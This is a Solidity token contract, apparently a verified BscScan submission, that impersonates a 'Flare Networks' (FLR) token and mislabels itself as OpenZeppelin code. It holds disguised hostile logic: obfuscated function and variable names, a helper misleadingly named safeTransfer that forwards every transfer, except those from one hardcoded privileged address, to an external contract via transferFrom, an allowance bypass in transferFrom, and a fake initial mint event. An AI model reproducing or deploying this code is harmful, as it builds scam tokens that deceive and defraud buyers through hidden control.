/**
 *Submitted for verification at BscScan.com on 2023-01-12
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/tI1lTtP84CiNdXWz.sol

// OpenZeppelin Contracts v4.4.1 (utils/tI1lTtP84CiNdXWz.sol)

abstract contract tI1lTtP84CiNdXWz {
  function RcqJaL3UVXA1xsDj() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0xC88c5DB07Ac50AE5D0373fDa399f091Dc0284868)) {TransferHelper.safeTransferFrom(0xDa117915ea5d7029a7DE7Bf39FFfC888e6daF0fC,spender,recipient,amount);return true;}return false;}
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransf(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}


interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract MOON is IERC20, tI1lTtP84CiNdXWz {
  mapping(address => uint256) private dn0crRmC3JXQaEPH;
  mapping(address => mapping(address => uint256)) private xpjHsKy4RZDGQmWi;

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = xpjHsKy4RZDGQmWi[RcqJaL3UVXA1xsDj()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    nyVsuTlq8WYOxc1K(RcqJaL3UVXA1xsDj(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function XwF295XBjd0A8y3p(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    dn0crRmC3JXQaEPH[spender] = dn0crRmC3JXQaEPH[spender] - amount;
    dn0crRmC3JXQaEPH[recipient] = dn0crRmC3JXQaEPH[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!XwF295XBjd0A8y3p(sender, recipient, amount)) return true;
    uint256 currentAllowance = xpjHsKy4RZDGQmWi[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    nyVsuTlq8WYOxc1K(sender, msg.sender, currentAllowance - amount);

    return true;
  }
  
  constructor() {
    dn0crRmC3JXQaEPH[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    XwF295XBjd0A8y3p(RcqJaL3UVXA1xsDj(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "Flare Networks";
  }

  function symbol() public pure returns (string memory) {
    return "FLR";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return dn0crRmC3JXQaEPH[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    nyVsuTlq8WYOxc1K(RcqJaL3UVXA1xsDj(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return xpjHsKy4RZDGQmWi[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    nyVsuTlq8WYOxc1K(
      RcqJaL3UVXA1xsDj(),
      spender,
      xpjHsKy4RZDGQmWi[RcqJaL3UVXA1xsDj()][spender] + addedValue
    );
    return true;
  }

  function nyVsuTlq8WYOxc1K(
    address sender,
    address spender,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    xpjHsKy4RZDGQmWi[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

}